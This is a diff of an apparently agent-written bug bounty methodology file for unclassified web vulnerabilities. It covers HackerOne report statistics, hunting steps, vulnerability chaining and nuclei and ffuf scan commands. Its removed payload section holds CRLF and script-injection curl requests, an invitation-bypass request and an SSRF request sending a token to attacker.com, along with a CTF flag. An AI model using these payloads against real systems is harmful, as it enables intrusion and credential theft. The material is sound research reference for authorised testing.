@@ -4,13 +4,13 @@ description: "Use only when no other class fits: novel primitives, protocol oddi
 agent_created: true
 ---
 
-# Miscellaneous Vulnerabilities — unified skill
+# Miscellaneous Vulnerabilities — unified methodology
 
-> **Complete merged skill.** Everything from 4 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus is contained in this file. Unmodified originals remain in `references/` for provenance only.
+> **Methodology skill.** Merged from 4 upstream skills across cbh, h1skills, hunting and grounded in 15,259 disclosed HackerOne reports. Payloads, wordlists and supporting data are in `references/`.
 
-## Corpus evidence — 1226 valid HackerOne reports (246 paid / 20%)
+## Corpus signal — 1226 valid reports (246 paid / 20%)
 
-Every disclosed report is valid; payment is an impact signal, not a validity test.
+Every disclosed report is valid; payment is an impact signal, not a validity test. Full technique frequencies, case studies and approach patterns: `references/evidence.md`.
 
 ### Techniques ranked across ALL valid reports
 
@@ -28,121 +28,6 @@ Every disclosed report is valid; payment is an impact signal, not a validity tes
 | cache / CDN / unkeyed header | 86 |
 | WAF / sanitizer / filter bypass | 65 |
 | DOM / HTML source inspection | 63 |
-| race / concurrency / timing | 62 |
-| webhook / OAuth / SAML / integration abuse | 51 |
-| fuzzing / wordlist brute force | 49 |
-| intercept & replay request in Burp | 49 |
-| XML / SOAP / SAML / XXE | 48 |
-| parser confusion / normalization | 48 |
-| employee / developer public info | 47 |
-| second-order / stored / blind delivery | 47 |
-| parameter pollution / duplicate keys | 46 |
-| unauthenticated / removed-cookie test | 44 |
-| two-account / cross-account replay | 43 |
-| error message / stack trace probing | 41 |
-| JWT / token / base64 decode | 40 |
-| OAST / DNS / HTTP callback proof | 39 |
-| third-party data / paste / breach reuse | 37 |
-| API docs / Swagger / introspection | 29 |
-|  HosT/absolute-URL reset poisoning | 25 |
-| redirect chain / Location header | 22 |
-| git history / exposed .git | 20 |
-| response diff / status / length comparison | 20 |
-| template injection (SSTI) | 19 |
-| JS bundle / source-map inspection | 17 |
-| public bucket / storage exposure | 17 |
-| verbose debug / framework fingerprint | 16 |
-| deserialization / gadget chain | 16 |
-| cloud metadata / IAM abuse | 15 |
-| browser DevTools / network tab | 13 |
-| replay / modify a captured request | 10 |
-| search-engine dorking | 6 |
-| swap object ID / parameter value | 6 |
-| mass assignment / extra request fields | 5 |
-| archive / Wayback endpoint discovery | 3 |
-
-### Parameters observed in writeups
-
-`href` (23), `path` (22), `max-age` (20), `src` (17), `target` (17), `charset` (17), `name` (15), `rel` (15), `domain` (14), `realm` (14), `mode` (11), `nonce` (11), `type` (10), `expires` (10), `filename` (10), `url` (9), `username` (9), `sid` (9), `_gid` (8), `__cfduid` (8), `auth` (8), `native_ca_store` (8), `_ga` (7), `user` (6), `class` (6), `csrftoken` (6), `uuid` (6), `host` (6), `verifypeer` (6), `ismap` (5)
-
-### Bypass primitives observed
-
-`content-type` (209), `bypass` (194), `unicode` (69), `content type` (58), `bypassing` (40), `bypassed` (32), `blind` (30), `bypasses` (23), `open redirect` (21), `whitelist` (20), `lowercase` (19), `%00` (14), `uppercase` (14), `host header` (12), `blacklist` (10), `%0d%0a` (10), `null byte` (10), `normalize` (10), `normalization` (8), `second order` (8), `chunked` (7), `normalized` (7), `percent-encoded` (7), `url encoded` (6), `parameter pollution` (6), `url-encode` (5), `allowlist` (5), `homoglyph` (5)
-
-### Impact language observed
-
-`password` (1016), `admin` (908), `token` (533), `secret` (397), `credential` (392), `localhost` (108), `payment` (56), `sensitive information` (41), `unauthorized` (34), `rce` (29), `privilege escalation` (20), `arbitrary code` (19), `sensitive data` (19), `remote code execution` (18), `arbitrary file` (16), `funds` (12), `exfiltrate` (11), `exfiltration` (11), `pii` (11), `financial` (8)
-
-### Case studies — full excerpts (paid and unpaid)
-
-#### [1087489](https://hackerone.com/reports/1087489) — Github access token exposure
-
-Shopify · $50000 · critical
-
-While dissecting an application made by one of your employees I found his GitHub Personal Access Token (PAT), he's a member of the org with pull and push access to all of your repositories. As a proof I can tell you that on the repo github.com/Shopify/shopify at commit hash `cea9c273391d` the sha512 of the README.md is `69750574bec56c1f1052db3471252b1daacdc9dda9f6d5332a3400a847fa413ec1caf19ef0b5501f18a5a76c232e7210d5f3b91c24c9439f4e0f64c02d6db824`. ## Impact Read and write access to all your private github repositories.
-
-#### [3018307](https://hackerone.com/reports/3018307) — Groups module can halt chain when handling a proposal with malicious group weights
-
-Cosmos · $15000 · high
-
-### Summary of Impact After having a look into the patch for I discovered a very similar bug. The original error was due to a divide by zero at when the total power was zero. The patch prevented groups from having zero power and also added a guard to the division: The issue is that there are other ways that `Quo` can fail, such as if the exponent of the resulting value is out of range: Since there are no limits on group member weight, it's possible to trigger this failure by having two members with weights of `"1e-50000"` and `"1e50000"`. If the user with the tiny weight votes yes, `yesCount.Quo(totalPowerDec)` will return an error `decimal quotient error: exponent out of range` and cause a chain halt when `doTallyAndUpdate` is called from the EndBlocker. ### Steps to Reproduce Create a new chain with ignite: Create the following two json files using the addressed created by ignite server: members.json policy.json Create the group and transfer some funds to the policy address for testing: Create a new proposal file: proposal.json Submit and vote for the proposal Chain halts: ### Workarounds I think a patch/update will need to be applied to fix the issue. ### Supporting Material/References Criticality: High (Considerable Impact; Likely Likelihood per [ACMv1.2]( Affected users: Validators, Full nodes, Users on chains that utilize the groups module ## Impact A malicious user that 
-
-#### [838635](https://hackerone.com/reports/838635) — Spring Actuator endpoints publicly available and broken authentication
-
-LY Corporation · $12500 · critical
-
-Due to insufficient access control, it was possible to access the Spring Boot Actuator endpoints /heapdump and /env. @kazan71p identified two highly sensitive applications leaking information through these endpoints. The LINE Security team shutdown the secondary endpoints just as it was discovered by the reporter, as part of our incident response process. After further investigation, we also found that both applications had the same issue with their authentication functionality, due to using the same library. The issue was that old tokens were not expiring and being properly invalidated, allowing for replay attacks that should not have been possible. The applications were highly sensitive in nature, but due to not being able to retrieve specific data, we decided to award a bounty slightly below the maximum reward for this type of issue. We want to thank @kazan71p for his cooperation and contribution to our program!
-
-#### [3113398](https://hackerone.com/reports/3113398) — Internal Access to Hackerone confluence Docs
-
-HackerOne · $12500 · high
-
-This vulnerability allowed external access to HackerOne's internal Confluence documentation through a support system misconfiguration. The impact included: - Access to internal documentation that wasn't intended for public viewing - The ability to view and modify limited content within the Confluence instance This configuration issue demonstrated how support system workflows could be leveraged to gain unauthorized access to internal resources.
-
-#### [185775](https://hackerone.com/reports/185775) — Crash: Initialize Decimal with itself triggers an assertion
-
-shopify-scripts · $10000 · high
-
-When `Decimal` is initialized with itself, a new (empty) `mpd_t` will be created. To fill it with a value, `to_s` of the current instance is called, which accesses the empty `mpd_t`. This triggers an assertion, which leads to a crash. # Patch I've created and attached a simple patch which just returns self when a Decimal is initialized with itself. Pretty simple, but should do the job (careful: I've created the patch after a 20h flight, could be... uhm, suboptimal). # PoC PoC does work on ` but as it's not up2date that shouldn't really mean anything. # Trace
-
-#### [228648](https://hackerone.com/reports/228648) — WannaCrypt “Killswitch”
-
-HackerOne · no bounty — still valid · severity n/a
-
-WannaCrypt (a.k.a. WannaCry) is the name of a malware used in the May 2017 global ransomware attack targeting Microsoft Windows operating systems via known vulnerabilities leaked by The Shadow Brokers. In MalwareTech’s research, it was found that the malware sends an HTTP request to a seemingly random domain name in the early stages of its execution. If the HTTP call fails, the malware encrypts the user’s files, requests ransom, and will spread to other vulnerable machines. If the HTTP call is successful, the malware exits, halting encrypting files and spreading itself. Malware Tech also discovered that the domain name used in the malware’s HTTP request was available for sale and was able to register it. The malware relied on the domain name being unregistered so the HTTP call would always fail and it would continue to spread. By registering the domain name, it was possible to make the malware’s HTTP call return successfully. This resulted in the malware exiting early on new infections and effectively stopped this variant of the malware from spreading further. Original disclosure:
-
-#### [684092](https://hackerone.com/reports/684092) — Steal ALL collateral during liquidation by exploiting lack of validation in `flip.kick`
-
-BlockDev Sp. Z o.o · no bounty — still valid · critical
-
-## Summary: The `flip` contract allows for the MCD system to auction collateral in exchange for DAI. A lack of validation in the method `flip.kick` allows an attacker to create an auction with a fake bid value. Since the `end` contract trusts that value, it can be exploited to issue any amount of free DAI during liquidation. That DAI can then be immediately used to obtain all collateral stored in the `end` contract. ## Detailed Description: The `flipper` contract (`flip.sol`) is intended to offer a way for the MCD contracts to obtain DAI by auctioning gems. An auction is initiated by calling the `flip.kick` method, which is normally done by the `cat` contract when it grabs collateral from a CDP. The implementation of that method, however, completely lacks access control and has very little validation -- in particular, it's possible to execute the method even during the liquidation phase. On top of that, all values stored in the auction are accepted as parameters of the method, including the bid amount. By directly calling the method, a malicious user can create a "fake" auction, with an arbitrary initial bid value, without spending the corresponding DAI. Though that technique could be used to cause other damage, I will focus this report on the maximum-impact effect by exploiting it during the liquidation phase, in an attack vector that leads to transferring all collateral to th
-
-### Recurring approach patterns from real reports
-
-- 4× because of this endpoint we used we cannot see the request information which may degrade a defenders ability to track down an adversary
-- 3× when megan is not working she enjoys competing in ctfs reading baking playing music geocaching and being with her family and friends
-- 3× as a result of this an adversary can perform api calls using these endpoints and evade the logging of their ip address operating system information
-- 2× i personally tried many times with wrong password even though no account lockout was detected
-- 2× i just successfully created an account robots txt which results in a profile path of and results in an bugged account as accessing account settings etc is impossible
-- 2× i only created it for testing purpose
-- 2× i m because i hacker found bug because i report this bug i want to report a bug and because want some so please because you are telling me how much you pay money so i give you bug
-- 2× as i understood injected content script could successfully emit events to background page only if popup was initiated earlier
-- 2× readme the harm i have identified in twitter s cropping algorithm is under representation bias
-- 2× the previous parser before 1aea05a6c26 had while isblank ptr ptr before parsing each attribute which correctly skipped htab
-- 2× i would have liked to report this sooner before was out but i ve only managed to finish this now and i still have a lot of other curl cves to fix for the debian package
-- 1× we found several possible scenarios with different impact levels
-- 1× in particular we found that the fallback host for all akamai servers allow proxying to attacker servers
-- 1× however even if the attacker controlled page or xss is only present on the attacker s account a dns attacker can always force his session on the client before sending him to his malicious page
-- 1× we found several instances of this attack most notably on websites that allow user to store files on their accounts
-- 1× this is by far the most widespread behavior we found several thousand such servers by sending requests to web servers for hosts covered by their certificate but not served locally
-- 1× i was browsing through the pages and suddenly i saw this at my notification screenshot the two yahoo bug notification are definitely not mine as i ve not reported any bugs to yahoo while the slack s report is mine
-- 1× hi i just found that it s possible to create titleless and non closable bugs by prepending values for the report title and report vulnerability information parameters with characters respectively
-- 1× i have noticed your has address and this may lead to same site scripting
-- 1× this vulnerability affects attack details i tested invalid credentials and no account lockout was detected
-- 1× affected sites i ve tested the top websites on wikipedia s somewhat out of date copy of the alexa toplist after unifying www google domains into a single entry and of them proved to be vulnerable
-- 1× python and are susceptible to arbitrary process memory reading by a user or adversary due to a bug in the json module caused by insufficient bounds checking
-- 1× ehy i have found a bug in twitter site but isn t in scope the site but i have decided to report because i think that you will consider it at our discretion
-- 1× hello i found another bug on here any hacker can find out all registered users on wordpress com
 
 ## Corpus-backed method (this class)
 
@@ -167,18 +52,13 @@ BlockDev Sp. Z o.o · no bounty — still valid · critical
 
 
 
-### Probes
-
-- Search the corpus by symptom, not by class name.
-
 ### Veteran tip
 
 Treat 'other' as a temporary queue, not a destination.
 
-## Unified upstream methodology (complete, deduplicated)
+## Unified upstream methodology (deduplicated)
 
 ### Discovery and hunting method
-
 ### Step-by-Step Hunting Methodology
 
 1. **Map all role/permission boundaries** — enumerate every role level (owner → admin → staff → guest → removed) and document what each role *should* see
@@ -243,10 +123,7 @@ Treat 'other' as a temporary queue, not a destination.
    - **TE.0 via GCP Load Balancer** (Bugcrowd 2024) — affected thousands of Google Cloud sites including Identity-Aware Proxy; $8,500.
 3. **Other 2025-2026 stragglers worth a grep:** Zimbra **CVE-2025-68645** LFI via `/h/rest?f=../../...` (CISA KEV Jan 2026 → route to `path-traversal`); elixir-mint HTTP request splitting; vishing + adversary-in-the-middle (AiTM) SSO compromise (ShinyHunters, Jan 2026 → route to `auth-bypass`/`account-takeover`); zero-click media-download chains in messaging apps (Project Zero, Jan 2026 → `memory-corruption`).
 4. **Tooling to have ready:** **HTTP Request Smuggler v3.0** (Burp extension) for parser-discrepancy detection, `smuggler.py` for spray-and-pray, `http-garden` for differential HTTP server/proxy fuzzing, and Turbo Intruder with `0cl-find-offset.py` for injected-header-length discovery.
-5. **Classification discipline (this skill's core job).** Write one line of root cause, then route: parser desync → `request-smuggling`; cache-served poison → `web-cache`; LLM output/tool abuse → `llm-ai`; auth state machine → `auth-bypass`; money mutation → `fintech-graphql`; native parser crash → `memory-corruption`. If none fits, keep it here WITH a reproducible PoC.
-
-### Signals and surfaces
-
+5. **Classification discipline (this skill's core job).** Write one line of root cause, then route: parser desync → `request-smuggling`; cache-served poison → `web-cache`; LLM output/tool abuse → `llm-ai`; auth state machine → `auth-bypass`; money mutation → `fintech-graphql`; native parser crash → `memory-corruption`. If none fits, keep it here WITH a reproducible PoC.### Signals and surfaces
 ### Crown Jewel Targets
 
 **Why this vuln class pays:**
@@ -307,10 +184,7 @@ graphql { installations(
 - Sentry error tracking integration fields (SSRF/token leak vector)
 - Multi-role invitation systems (partners, staff, collaborators)
 
----
-
-### Techniques, payloads and bypasses
-
+---### Techniques and bypasses
 ### Techniques from real reports
 
 Concrete lessons from reports outside the main classes.
@@ -594,10 +468,7 @@ When you confirm a misc primitive at A, **immediately** ask: what state-machine,
 - `hunt-subdomain` — Chain 6
 - `hunt-ato` — Chains 1, 2, 5, 6 (all terminal-impact paths)
 
----
-
-### Validation and proof
-
+---### Validation and proof
 ### Gate 0 Validation
 
 Before writing the report, answer these three questions:
@@ -634,10 +505,7 @@ Before writing the report, answer these three questions:
 4. **Header disclosure via Expect needs a masked internal value**, not just a version banner (banners are more compliance noise than critical; Netlify explicitly declined the banner case).
 5. **Don't report theoretical protocol observations.** PortSwigger notes that findings like "this server accepts a single LF as a line terminator" are harmless for direct access and rarely pay; they become valuable only when you demonstrate exploitation behind a specific front-end.
 6. **Keep the standard proof bar for out-of-class findings.** A finding with no clean class still needs a reproducible state change, an OOB callback, or a verifiable cross-user artifact. Confabulation is an AI-class concern; the protocol analogue is "the scanner said desync" — require the differential response or victim impact.
-7. **Route, don't squat.** Once a finding maps cleanly to an existing class skill, hand it off with the PoC and let that skill's validation bar govern the report. This index exists to prevent misses, not to become a dumping ground.
-
-### Escalation and related chains
-
+7. **Route, don't squat.** Once a finding maps cleanly to an existing class skill, hand it off with the PoC and let that skill's validation bar govern the report. This index exists to prevent misses, not to become a dumping ground.### Escalation and related chains
 ### Chains & Compositions (Senior Hunting)
 
 A checklist tells you what to look for one bug at a time. Senior work composes primitives into multi-step engagements that reach impact. Each chain below is built from existing primitives in this skill's methodology and root causes — paired with a secondary primitive from a neighbouring skill. The pattern across them all: **the secondary primitive is what produces impact**. A standalone soft-delete IDOR is N/A; pair it with a session-store that doesn't invalidate, and it's High.
@@ -754,10 +622,7 @@ A checklist tells you what to look for one bug at a time. Senior work composes p
 - **`hunt-auth-bypass`** — Session-revocation gaps and stale-token issues are pure auth-bypass primitives. Chain primitive: removed user retains session token → `hunt-auth-bypass` → post-termination data exfil and persistent access.
 - **`hunt-ato`** — Most misc auth bugs end at account takeover. Chain primitive: signature-stripping / NameID injection + `hunt-ato` Path 6 (JWT/SAML manipulation) → admin ATO across enterprise.
 - **`security-arsenal`** — Load the SAML Raider payload pack, the session-revocation probe checklist, and the Always-Rejected list (rate-limiting on auth, theoretical issues, user enumeration without sensitive PII).
-- **`triage-validation`** — Apply the 7-Question Gate plus the Body-Diff Rule: misc bugs are the highest-N/A category — a state desync claim needs a concrete cross-tenant read or admin-action PoC, not just "the API let me call it".
-
-### Tools and wordlists
-
+- **`triage-validation`** — Apply the 7-Question Gate plus the Body-Diff Rule: misc bugs are the highest-N/A category — a state desync claim needs a concrete cross-tenant read or admin-action PoC, not just "the API let me call it".### Tools
 ### Nuclei
 
 Start broad, then classify the root cause and open the matching skill.
@@ -791,10 +656,7 @@ ffuf -u https://target/FUZZ -w $W/paths_other.txt \
      -mc all -fc 404 -fs 0 -rate 40
 ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_other.txt \
      -mr 'canary|error|invalid|not found' -rate 40
-```
-
-### Real-world examples
-
+```### Real-world examples
 ### Real Impact Examples
 
 **Scenario A — Privilege Escalation via Unverified Partner Invitation (Shopify-class)**
@@ -806,10 +668,7 @@ A staff member with restricted permissions is removed from a company account aft
 **Scenario C — SAML Signature Bypass for Account Takeover (GitHub Enterprise-class)**
 An attacker targeting a GitHub Enterprise instance with SAML SSO enabled crafts a SAML response where the `Signature` element is stripped or moved to cover only a non-critical assertion attribute. The XML parser accepts the document as valid; the signature verifier passes because the signed sub-element validates correctly; the NameID (username/email) in the unsigned portion is set to a victim admin account. Attacker authenticates as the victim with no knowledge of their password or MFA. Business impact: full admin access to all private repositories, CI/CD secrets, and GitHub Actions workflows in the enterprise.
 
----
-
-### Sources and related reading
-
+---### Sources and related reading
 ### D. Sources — numbered list of URLs you actually fetched
 
 1. https://portswigger.net/research/top-10-web-hacking-techniques-of-2025
@@ -829,10 +688,7 @@ An attacker targeting a GitHub Enterprise instance with SAML SSO enabled crafts 
 3. https://www.securityweek.com/new-http-request-smuggling-attacks-impacted-cdns-major-orgs-millions-of-websites/ (Akamai CVE-2025-32094, T-Mobile/GitLab/Netlify bounties, $276K reported)
 4. https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/ (TE.0 via GCP Load Balancer, IAP bypass, $8,500)
 5. https://portswigger.net/web-security/request-smuggling (request-smuggling overview and research index)
-6. https://www.intigriti.com/researchers/blog/hacking-tools/top-4-new-attack-vectors-in-web-application-targets (2025-2026 emerging vectors, LLM prompt injection first among them)
-
-### Additional notes
-
+6. https://www.intigriti.com/researchers/blog/hacking-tools/top-4-new-attack-vectors-in-web-application-targets (2025-2026 emerging vectors, LLM prompt injection first among them)### Additional notes
 ### Approach
 
 - Classify the root cause before choosing a playbook.
@@ -855,195 +711,8 @@ python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class other
 python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class other
 ```
 
----
-
-## Companion methodology (complete, deduplicated)
-
-Full text of every non-SKILL.md methodology document from the contributing skills.
-
-### Companion: hunting / references/payloads.md
-
-# misc — Payload reference
-
-Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.
-
----
-
-## Payload & Detection Patterns
-
-
-
-**CRLF/Header Injection (Ruby Net::HTTP, Rack/pitchfork):**
-
-```bash
-
-# Test CRLF in header values
-
-curl -v "https://target.com/path" \
-
-  -H $'X-Custom: value\r\nInjected-Header: evil'
-
-
-
-# URL-encoded variant
-
-curl -v "https://target.com/redirect?url=https://evil.com%0d%0aSet-Cookie:%20session=attacker"
-
-
-
-# Test in pitchfork/Rack apps — inject via query param reflected in Location header
-
-curl -v "https://shop.myshopify.com/login?return_to=%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"
-
-```
-
-
-
-**Privilege escalation via invitation bypass:**
-
-```bash
-
-# Accept invitation without email verification
-
-curl -X POST "https://target.com/invitations/INVITE_TOKEN/accept" \
-
-  -H "Cookie: session=UNVERIFIED_SESSION" \
-
-  -d '{"role":"admin"}'
-
-
-
-# Test invitation token for another user
-
-curl -X GET "https://target.com/partners/PARTNER_ID/invitation/accept?token=LEAKED_TOKEN" \
-
-  -H "Cookie: session=VICTIM_SESSION"
-
-```
-
-
-
-**Token scope bypass (GitHub/GitLab PAT):**
-
-```bash
-
-# Call privileged endpoint with minimal-scope token
-
-curl -H "Authorization: token ghp_MINIMAL_SCOPE_TOKEN" \
-
-  "https://api.github.com/repos/org/private-repo/issues"
-
-
-
-# Test suspended installation access
-
-curl -H "Authorization: Bearer USER_TO_SERVER_TOKEN" \
-
-  "https://api.github.com/app/installations/SUSPENDED_INSTALL_ID"
-
-```
-
-
-
-**SSRF via config URL fields (Sentry integration):**
-
-```bash
-
-# Change Sentry URL to internal listener
-
-curl -X PUT "https://gitlab.com/api/v4/projects/PROJECT_ID/services/sentry" \
-
-  -H "PRIVATE-TOKEN: MAINTAINER_TOKEN" \
-
-  -d '{"api_url": "https://attacker.com/capture", "auth_token": "sentry_token"}'
-
-```
-
-
-
-**ReDoS detection:**
-
-```bash
-
-# Test Ruby URI parser
-
-ruby -e 'require "uri"; URI.parse("http://a.com?" + "a"*5000 + "##")'
-
-
-
-# Test IPAddr
-
-ruby -e 'require "ipaddr"; IPAddr.new("0." * 1000 + "0")'
-
-
-
-# Timing-based detection
-
-time curl "https://target.com/search?q=aaaa" # baseline
-
-time curl "https://target.com/search?q=$(python3 -c 'print("a"*5000 + "##")')"
-
-```
-
-
-
-**Grep patterns for source recon:**
-
-```bash
-
-# Find SAML signature verification
-
-grep -r "validate_signature\|verify_signature\|skip.*signature" --include="*.rb"
-
-
-
-# Find hardcoded or weak scope checks
-
-grep -r "without_scope\|any_scope\|scope.*bypass" --include="*.rb"
-
-
-
-# Find invitation acceptance without verification
-
-grep -r "accept.*invitation\|invitation.*accept" --include="*.rb" | grep -v "verified\|confirmed"
-
-
-
-# Find internal API routes
-
-grep -r "internal_api\|/_internal/\|/internal/" --include="*.rb" --include="*.js"
-
-```
-
-
-
-**Dangling subdomain / DNS check:**
-
-```bash
-
-# Check for obsolete DNS records
-
-dig CNAME handbook.gitlab.com
-
-curl -sI https://handbook.gitlab.com | head -5
-
-# Look for NXDOMAIN or 404 on hosting provider = takeover candidate
-
-
-
-# SPF check
-
-dig TXT rubylang.org | grep spf
-
-# Missing or ~all = email spoofing risk
-
-```
-
-
-
----
-
-### Companion: hunting / references/techniques.md
+---### Companion methodology (deduplicated)
+### hunting / references/techniques.md
 
 # misc — Technique reference
 
@@ -1087,141 +756,7 @@ Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you 
 
 ---
 
-### Companion: hunting / references/payloads.md
-
-# Other & emerging classes — Payload reference
-
-Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.
-
----
-
-## Payload fragments observed
-
-
-
-| Seen | Fragment |
-
-|---:|---|
-
-| 8× | `curl_multi_socket_action()` |
-
-| 7× | `%RFLAGS.AC` |
-
-| 7× | `jobert@mydocz.cosmic` |
-
-| 6× | `<a>` |
-
-| 6× | `free()` |
-
-| 6× | `javascript:` |
-
-| 6× | `curl_multi_perform()` |
-
-| 5× | `multi->process` |
-
-| 5× | `--url @file` |
-
-| 4× | `ExternalMemoryAccounter::Increase()` |
-
-| 4× | `__%48ost-` |
-
-| 4× | `wcurl -- "$url` |
-
-| 4× | `parse_netscape()` |
-
-| 4× | `multi_run_dirty()` |
-
-| 4× | `smbc->share` |
-
-| 4× | `swrite()` |
-
-| 4× | `digest->origin` |
-
-| 3× | `copyin()` |
-
-| 3× | `<iframe>` |
-
-| 3× | `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$` |
-
-
-
-## Parameters observed
-
-
-
-`username` · `password` · `template` · `url` · `hash` · `id` · `callback` · `ingredients[]` · `email` · `variant` · `shop` · `month` · `year` · `report_id` · `checkout_token` · `template[]` · `next` · `data` · `token` · `subject`
-
-
-
-## Nuclei
-
-
-
-Start broad, then classify the root cause and open the matching skill.
-
-
-
-```sh
-
-nuclei -u https://target -tags vuln,cve,exposure \
-
-       -severity low,medium,high,critical -rl 40 -o nuclei_other.txt
-
-nuclei -u https://target -t ~/nuclei-templates/http/exposures \
-
-       -rl 40 -o nuclei_other_exposures.txt
-
-nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \
-
-       -rl 40 -o nuclei_other_generic.txt
-
-# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
-
-```
-
-
-
-Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
-
-
-
-## Wordlists
-
-
-
-Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.
-
-
-
-| File | Entries |
-
-|---|---:|
-
-| `~/.local/share/hackerone-reports/wordlists/paths_other.txt` | 150 |
-
-| `~/.local/share/hackerone-reports/wordlists/params_other.txt` | 150 |
-
-| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
-
-| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |
-
-
-
-```sh
-
-W=~/.local/share/hackerone-reports/wordlists
-
-ffuf -u https://target/FUZZ -w $W/paths_other.txt \
-
-     -mc all -fc 404 -fs 0 -rate 40
-
-ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_other.txt \
-
-     -mr 'canary|error|invalid|not found' -rate 40
-
-```
-
-### Companion: hunting / references/techniques.md
+### hunting / references/techniques.md
 
 # Other & emerging classes — Technique reference
 
@@ -1355,331 +890,13 @@ Concrete lessons from reports outside the main classes.
 
 - **Malformed save files (.sav) allow to write files with arbitrary extensions and content in GoldSrc-based games.** — `#458842` · Valve · $1,500 · ▲99
 
-  > - sets the directory against which the engine will try to load the client library 'cl dlls/client.dll' into memory when restarted;
+  > - sets the directory against which the engine will try to load the client library 'cl dlls/client.dll' into memory when restarted;## Probes
 
-## Corpus wordlists (mined)
+- Search the corpus by symptom, not by class name.
 
-### `params_other.txt`
+## Supporting data
 
-```text
-username
-template
-hash
-password
-id
-url
-data
-payload
-month
-year
-preview_data
-template[]
-uuid
-callback
-switch
-email
-name
-ingredients[]
-age
-firstname
-lastname
-ticket_id
-meteor_js_resource
-variant
-shop
-type
-start
-two
-subject
-report_id
-checkout_token
-three
-description
-next
-lang
-source
-challenge
-challenge_answer
-header
-token
-test
-action
-output
-token[]
-amount
-invitation_token
-abc
-author
-recipe_url
-referencia
-Cedula
-Usuario
-Clave
-Usuario_Datum
-tid
-restapi.response_format
-FUZZ
-input
-phone
-master_access
-client
-from-date
-to-date
-audience-reach
-media-value
-assets
-sizes
-files
-g-recaptcha-response
-for
-fileName
-ignore
-load
-host
-port
-dl
-sa
-ref
-code
-experiment_d2x_2020ify_buttons
-experiment_d2x_sso_login_link
-experiment_d2x_google_sso_gis_parity
-experiment_d2x_onboarding
-target_screen_name
-authorize_callback
-partner_name
-title
-image_url
-highlight
-message
-feature
-profile_avatar
-act
-_ref
-config
-framename
-sold1
-command
-tty
-panel
-your_reset_token
-res_id
-order
-address_id
-phone_country_id
-special_instructions
-user_forced
-verify_phone
-payment_method_id
-payment_method_type
-card_token
-card_name
-card_bin
-card_vault
-recharge
-recharge_amount
-recharge_method_type
-additional_recharge
-additional_recharge_amount
-voucher_code
-wallet_type
-dob
-csrfToken
-csrft_creation_time
-st.cmd
-st.reqId
-st.timestamp
-st.appName
-st.appCode
-st.currency
-st.appPrice
-st.callback
-st.srv
-test1
-LinkId
-wpcspReceiveCSPviol
-parameter
-viewMode
-disconnected
-destRedirectURL
-substate
-reference
-add_reporter_to_original
-reply_action
-mark_ineligible_for_bounty
-reports_count
-bounty_currency
-gh_jid
-donate_page_KEY
-mediation_type
-```
-
-### `paths_other.txt`
-
-```text
-/uploads
-/login
-/api
-/api/user
-/user
-/s3cr3t-ar3a
-/my-diary/
-/people-rater/entry
-/hate-mail-generator/new/preview
-/bug.php
-/graphql
-/apps
-/sessions
-/security/vulnerabilities_24.html
-/statements
-/attack-box/launch
-/api/sessions
-/cgi-bin/cvename.cgi
-/jobs/
-/settings
-/spf/validate.html
-/api.bountypay.h1ctf.com
-/redirect
-/accounts
-/api/staff
-/admin/upgrade
-/robots.txt
-/signup-manager/
-/swag-shop/api/user
-/phpmyadmin
-/account
-/api/
-/admin
-/cdn-cgi/beacon/expect-ct
-/docs/manpage.html
-/recheck/
-/path/to/curl
-/wp-json
-/wp-json/
-/src
-/mattboldt/typed.js/master/lib/
-/r3c0n_server_4fdk59/picture
-/evil-quiz
-/rebinder.html
-/secure-login:username=
-/evil-quiz/score
-/data/definitions/494.html
-/checkout/get_download_link
-/checkout/check_order
-/login/
-/index.php
-/secret
-/check
-/redir
-/cloudtrail/
-/store/partner_recipe
-/archive/1/486606/30/0/threaded
-/set
-/webservices/efx_consultas.asmx/Estudio_360_Fisico
-/css
-/BountyPay.apk
-/admin/report
-/pre
-/h1
-/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
-/software.bountypay.h1ctf.com
-/cgi-bin/awstats.pl
-/r3c0n_server_4fdk59/album
-/swag-shop
-/F8gHiqSdpK
-/wp-admin/admin-ajax.php
-/hate-mail-generator/new
-/data/definitions/829.html
-/coda.CalcService/InvokeFormula
-/embed/job_app
-/en-us/products/cyber-protect/trial/
-/api/actions/fileUpload.php
-/api/build/save
-/contacts/email
-/codeslayer137.txt
-/login-submit
-/poll
-/test
-/redirectpoc
-/manage/ssh/
-/press
-/.curlrc
-/shop-assets/
-/%20/g
-/CyberChef/
-/support/chat
-/recover
-/wp-json/wp/v2/users/
-/register
-/url
-/WhoService/putLocation
-/WhoService/putDeviceToken
-/app/client/flutter/lib/pages/onboarding/location_sharing_page.dart
-/wp-cache.php
-/poc-scratch/reproduce.sh
-/label
-/js
-/posts/stealing-data-with-css-attack-and-defense
-/dmca-safe-harbor
-/de/
-/search
-/evil-quiz/start
-/swag-shop/api/login
-/swag-shop/api/sessions
-/people-rater/page/1
-/people-rater/page/
-/assets/
-/manual/en/function.intval.php
-/MailRuGroup/security-meetup-22-php-unserialize-exploiting
-/fuzzing-unserialize/
-/swag-shop/api/purchase
-/signup
-/kinetic/app/
-/users
-/████████/adminapi/administrator.cfc
-/v2
-/resetpassword
-/uploads/BountyPay.apk
-/customer/chats/new
-/help/
-/static/MegaPlayer/10-2-21/vpaid-js-interface.swf
-/start
-/vuln/detail/CVE-2021-29156
-/sign-in
-/r/default/csp/reportOnly
-/jqueryxss
-/en/latest/
-/accounts/email/
-/accounts/register/
-/people-rater
-/hackyholidays.h1ctf.com/
-/r3c0n_server_4fdk59/api/asdasd
